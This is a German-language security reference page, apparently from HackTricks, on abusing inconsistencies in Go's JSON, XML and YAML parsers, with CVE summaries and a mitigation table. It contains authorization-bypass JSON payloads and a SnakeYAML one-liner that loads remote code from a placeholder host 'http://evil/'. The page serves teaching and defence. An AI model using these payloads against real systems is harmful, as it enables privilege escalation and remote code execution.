# JSON, XML & Yaml Hacking & Probleme

{{#include ../banners/hacktricks-training.md}}

## Go JSON Decoder

Die folgenden Probleme wurden im Go JSON erkannt, obwohl sie auch in anderen Sprachen vorhanden sein k√∂nnten. Diese Probleme wurden in [**this blog post**](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/) ver√∂ffentlicht.

Go‚Äôs JSON, XML, and YAML parsers have a long trail of inconsistencies and insecure defaults that can be abused to **bypass authentication**, **escalate privileges**, or **exfiltrate sensitive data**.


### (Un)Marshaling Unexpected Data

Ziel ist es, structs auszunutzen, die einem Angreifer erlauben, sensible Felder zu lesen/schreiben (z. B. `IsAdmin`, `Password`).

- Beispiel Struct:
```go
type User struct {
Username string `json:"username,omitempty"`
Password string `json:"password,omitempty"`
IsAdmin  bool   `json:"-"`
}
```
- Common Vulnerabilities

1. **Missing tag** (kein Tag = Feld wird standardm√§√üig weiterhin geparst):
```go
type User struct {
Username string
}
```
Payload:
```json
{"Username": "admin"}
```
2. **Falsche Verwendung von `-`**:
```go
type User struct {
IsAdmin bool `json:"-,omitempty"` // ‚ùå wrong
}
```
Payload:
```json
{"-": true}
```
‚úîÔ∏è Richtiger Weg, ein Feld davon abzuhalten, (un)marshaled zu werden:
```go
type User struct {
IsAdmin bool `json:"-"`
}
```
### Parser-Differenzen

Das Ziel ist, die Autorisierung zu bypassen, indem man ausnutzt, dass verschiedene Parser dieselbe payload unterschiedlich interpretieren, z. B.:
- CVE-2017-12635: Apache CouchDB bypass via duplicate keys
- 2022: Zoom 0-click RCE via XML parser inconsistency
- GitLab 2025 SAML bypass via XML quirks


**1. Duplicate Fields:**
Go's `encoding/json` nimmt das **letzte** Feld.
```go
json.Unmarshal([]byte(`{"action":"UserAction", "action":"AdminAction"}`), &req)
fmt.Println(req.Action) // AdminAction
```
Andere Parser (z. B. Java‚Äôs Jackson) k√∂nnten das **erste** nehmen.

**2. Gro√ü-/Kleinschreibung:**
Go ist gegen√ºber Gro√ü- und Kleinschreibung unempfindlich:
```go
json.Unmarshal([]byte(`{"AcTiOn":"AdminAction"}`), &req)
// matches `Action` field
```
Sogar Unicode-Tricks funktionieren:
```go
json.Unmarshal([]byte(`{"a‚Ñ™tion≈ø": "bypass"}`), &req)
```
**3. Cross-Service-Fehlanpassung:**
Angenommen:
- Proxy in Go geschrieben
- AuthZ-Service in Python geschrieben

Angreifer sendet:
```json
{
"action": "UserAction",
"AcTiOn": "AdminAction"
}
```
- Python erkennt `UserAction` und erlaubt es
- Go erkennt `AdminAction` und f√ºhrt es aus


### Data Format Confusion (Polyglots)

Das Ziel ist, Systeme auszunutzen, die Formate mischen (JSON/XML/YAML) oder bei Parser-Fehlern fail open sind, wie zum Beispiel:
- **CVE-2020-16250**: HashiCorp Vault hat JSON mit einem XML-Parser geparst, nachdem STS JSON statt XML zur√ºckgegeben hatte.

Der Angreifer kontrolliert:
- Den Header `Accept: application/json`
- Teilweise Kontrolle √ºber den JSON-Body

Der XML-Parser von Go hat es **trotzdem** geparst und der injizierten Identit√§t vertraut.

- Crafted payload:
```json
{
"action": "Action_1",
"AcTiOn": "Action_2",
"ignored": "<?xml version=\"1.0\"?><Action>Action_3</Action>"
}
```
Ergebnis:
- **Go JSON** parser: `Action_2` (Gro√ü-/Kleinschreibung wird nicht unterschieden; letzter Eintrag gewinnt)
- **YAML** parser: `Action_1` (Gro√ü-/Kleinschreibung beachten)
- **XML** parser: parst "Action_3" innerhalb des Strings

---

## Bedeutende Parser-Schwachstellen (2023‚Äì2025)

> Die folgenden √∂ffentlich ausnutzbaren Probleme zeigen, dass unsicheres Parsen ein mehrsprachiges Problem ist ‚Äî nicht nur ein Go-Problem.

### SnakeYAML Deserialization RCE (CVE-2022-1471)

* Betroffen: `org.yaml:snakeyaml` < **2.0** (verwendet von Spring-Boot, Jenkins, etc.).
* Ursache: `new Constructor()` deserialisiert **beliebige Java-Klassen**, wodurch gadget chains m√∂glich werden, die in Remote-Code-Ausf√ºhrung m√ºnden.
* One-liner PoC (√∂ffnet den Taschenrechner auf dem verwundbaren Host):
```yaml
!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://evil/"] ] ] ]
```
* Fix / Abhilfe:
1. **Upgrade to ‚â•2.0** (uses `SafeLoader` by default).
2. On older versions, explicitly use `new Yaml(new SafeConstructor())`.

### libyaml Double-Free (CVE-2024-35325)

* Betroffen: `libyaml` ‚â§0.2.5 (C library, die von vielen language bindings verwendet wird).
* Problem: Das doppelte Aufrufen von `yaml_event_delete()` f√ºhrt zu einem double-free, das Angreifer in DoS oder in bestimmten Szenarien in Heap-Exploitation verwandeln k√∂nnen.
* Status: Upstream hat es als ‚ÄûAPI-Misuse‚Äú abgelehnt, aber Linux-Distributionen lieferten die gepatchte **0.2.6**, die den Pointer defensiv auf NULL setzt.

### RapidJSON Integer (Under|Over)-flow (CVE-2024-38517 / CVE-2024-39684)

* Betroffen: Tencent **RapidJSON** before commit `8269bc2` (<1.1.0-patch-22).
* Fehler: In `GenericReader::ParseNumber()` erlaubt ungepr√ºfte Arithmetik Angreifern, riesige numerische Literale zu erzeugen, die umschlagen und den Heap korruptieren ‚Äî letztlich erm√∂glicht das Privilegieneskalation, wenn der resultierende Objektgraph f√ºr Autorisierungsentscheidungen verwendet wird.

---

### üîê Gegenma√ünahmen (aktualisiert)

| Risiko                              | Fix / Empfehlung                                           |
|-------------------------------------|------------------------------------------------------------|
| Unbekannte Felder (JSON)            | `decoder.DisallowUnknownFields()`                          |
| Doppelte Felder (JSON)              | ‚ùå Keine Behebung in stdlib ‚Äî validieren mit [`jsoncheck`](https://github.com/dvsekhvalnov/johnny-five) |
| Fallunabh√§ngiger Abgleich (Go)      | ‚ùå Keine L√∂sung ‚Äî struct tags validieren + Eingabe vorab kanonisieren |
| XML garbage data / XXE              | Verwende einen geh√§rteten Parser (`encoding/xml` + `DisallowDTD`) |
| Unbekannte YAML-Schl√ºssel           | `yaml.KnownFields(true)`                                   |
| **Unsichere YAML-Deserialisierung** | Verwende SafeConstructor / auf SnakeYAML ‚â•2.0 aktualisieren |
| libyaml ‚â§0.2.5 double-free          | Auf **0.2.6** oder eine von der Distribution gepatchte Version aktualisieren |
| RapidJSON <patched commit           | Mit der aktuellen RapidJSON (‚â•July 2024) kompilieren       |

## Siehe auch

{{#ref}}
mass-assignment-cwe-915.md
{{#endref}}

## Quellen

- Baeldung ‚Äì ‚ÄúResolving CVE-2022-1471 With SnakeYAML 2.0‚Äù
- Ubuntu Security Tracker ‚Äì CVE-2024-35325 (libyaml)

{{#include ../banners/hacktricks-training.md}}
